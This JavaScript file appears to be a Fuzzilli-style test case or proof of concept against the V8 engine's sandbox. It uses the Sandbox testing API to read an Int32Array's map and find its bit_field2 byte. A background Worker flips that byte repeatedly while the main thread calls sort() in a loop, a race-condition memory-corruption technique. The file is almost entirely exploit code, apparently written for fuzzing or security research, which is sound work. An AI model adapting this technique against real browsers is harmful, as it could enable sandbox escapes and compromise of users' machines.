try {
    function f0() {
    }
    const v3 = Sandbox?.MemoryView;
    let v6;
    try { v6 = new v3(0, 4294967296); } catch (e) {}
    let v7;
    try { v7 = new DataView(v6); } catch (e) {}
    let sbx_memory = v7;
    let len = 131072;
    const v14 = Int32Array?.BYTES_PER_ELEMENT * len;
    let v15;
    try { v15 = new SharedArrayBuffer(v14); } catch (e) {}
    let v16;
    try { v16 = new Int32Array(v15); } catch (e) {}
    let ar = v16;
    function corruptInBackground(a19, a20, a21) {
        function workerTemplate(a23, a24, a25) {
            const v26 = Sandbox?.MemoryView;
            let v29;
            try { v29 = new v26(0, 4294967296); } catch (e) {}
            let v30;
            try { v30 = new DataView(v29); } catch (e) {}
            let memory = v30;
            while (true) {
                try { memory.setUint8(a23, a24, true); } catch (e) {}
                try { memory.setUint8(a23, a25, true); } catch (e) {}
            }
        }
        const v38 = `(${workerTemplate})(${a19}, ${a20}, ${a21})`;
        let v39;
        try { v39 = new Function(v38); } catch (e) {}
        const workerCode = v39;
        const v43 = { type: "function" };
        let v44;
        try { v44 = new Worker(workerCode, v43); } catch (e) {}
        return v44;
    }
    const v47 = Sandbox?.base;
    let v48;
    try { v48 = v47.toString(16); } catch (e) {}
    const v49 = "Sandbox.base: 0x" + v48;
    try { f0(v49); } catch (e) {}
    let v51;
    try { v51 = Sandbox.getAddressOf(ar); } catch (e) {}
    let ar_addr = v51;
    let v55;
    try { v55 = ar_addr.toString(16); } catch (e) {}
    const v56 = "ar: 0x" + v55;
    try { f0(v56); } catch (e) {}
    let v59;
    try { v59 = sbx_memory.getUint32(ar_addr, true); } catch (e) {}
    let ar_map = v59;
    let v63;
    try { v63 = ar_map.toString(16); } catch (e) {}
    const v64 = "ar map: 0x" + v63;
    try { f0(v64); } catch (e) {}
    let bit_field2_addr = ar_map + 10;
    let v71;
    try { v71 = bit_field2_addr.toString(16); } catch (e) {}
    const v72 = "bit_field2_addr: 0x" + v71;
    try { f0(v72); } catch (e) {}
    let v74;
    try { v74 = sbx_memory.getUint8(bit_field2_addr); } catch (e) {}
    let bit_field2_val = v74;
    let v78;
    try { v78 = bit_field2_val.toString(16); } catch (e) {}
    const v79 = "bit_field2_addr value: 0x" + v78;
    try { f0(v79); } catch (e) {}
    const v82 = bit_field2_val ^ 255;
    let v83;
    try { v83 = corruptInBackground(bit_field2_addr, bit_field2_val, v82); } catch (e) {}
    let worker = v83;
    while (true) {
        try { ar.sort(); } catch (e) {}
    }
} catch(e87) {
}
